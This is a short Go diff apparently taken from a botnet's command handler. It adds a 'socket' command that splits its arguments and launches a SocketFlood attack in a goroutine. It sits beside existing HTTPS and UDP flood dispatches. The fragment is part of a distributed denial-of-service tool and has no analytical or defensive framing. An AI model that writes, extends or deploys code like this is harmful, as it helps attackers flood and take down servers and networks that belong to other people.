@@ -18,6 +18,13 @@ func CommandHandler(command string) {
 		go methods.HttpsDefault(args[1], args[2], args[3], args[4])
 	}
 
+	if strings.HasPrefix(commandd, "socket") {
+
+		args := strings.Split(commandd, " ")
+
+		go methods.SocketFlood(args[1], args[2], args[3])
+	}
+
 	if strings.HasPrefix(commandd, "udpmix") {
 		args := strings.Split(commandd, " ")
 
